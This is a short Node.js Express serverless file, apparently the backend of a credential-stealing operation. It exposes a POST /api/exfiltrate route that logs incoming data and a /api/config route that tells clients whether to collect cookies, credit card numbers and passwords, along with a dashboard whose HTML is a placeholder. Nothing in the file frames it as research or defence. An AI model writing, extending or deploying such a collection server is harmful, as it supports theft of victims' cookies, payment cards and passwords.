const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const serverless = require('serverless-http');
require('dotenv').config();

const app = express();

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// محتوى لوحة التحكم مدمج مباشرة
const dashboardHTML = `
PASTE_HTML_HERE
`;

// API Routes
app.post('/api/exfiltrate', (req, res) => {
    console.log('Data received:', req.body);
    res.json({ status: 'success' });
});

app.get('/api/config', (req, res) => {
    res.json({
        collect_cookies: process.env.COLLECT_COOKIES === 'true',
        collect_credit_cards: process.env.COLLECT_CREDIT_CARDS === 'true',
        collect_passwords: process.env.COLLECT_PASSWORDS === 'true'
    });
});

// Dashboard Route
app.get('/dashboard', (req, res) => {
    res.send(dashboardHTML);
});

app.get('/', (req, res) => {
    res.redirect('/dashboard');
});

module.exports.handler = serverless(app);
